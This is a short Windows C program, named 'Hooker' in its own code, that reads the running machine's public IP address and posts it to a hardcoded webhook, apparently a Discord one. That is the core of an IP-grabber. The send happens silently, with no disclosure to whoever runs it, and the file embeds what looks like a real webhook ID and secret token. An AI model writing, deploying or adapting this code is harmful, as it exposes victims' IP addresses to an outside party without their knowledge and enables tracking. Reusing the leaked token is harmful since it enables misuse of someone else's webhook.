#include <stdio.h>

#include <windows.h>
#include <winhttp.h>

#include "helper.h"

LPCWSTR webhookId = L"1115024727396860075";
LPCWSTR webhookToken = L"5tv77wH3SnmHa8P6vKvFTXHk_oY_YaNxa_iBQ-n8M23PilrJP0K9AWySIWAN_yklQbL1";

int main()
{
	HINTERNET hSession;
	while (1)
	{
		hSession = WinHttpOpen(L"Hooker", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
		if (hSession == NULL)
			continue;
		break;
	}

	// Buffer Setup for Recieving IP
	char buffer[64];
	DWORD bytesRead;
	memset(buffer, 0, 64);
	
	// Get IP from API
	getIp(hSession, buffer, &bytesRead);

	// Send Webhook
	sendWebhook(hSession, webhookId, webhookToken, buffer, bytesRead);

	WinHttpCloseHandle(hSession);
	return 0;
}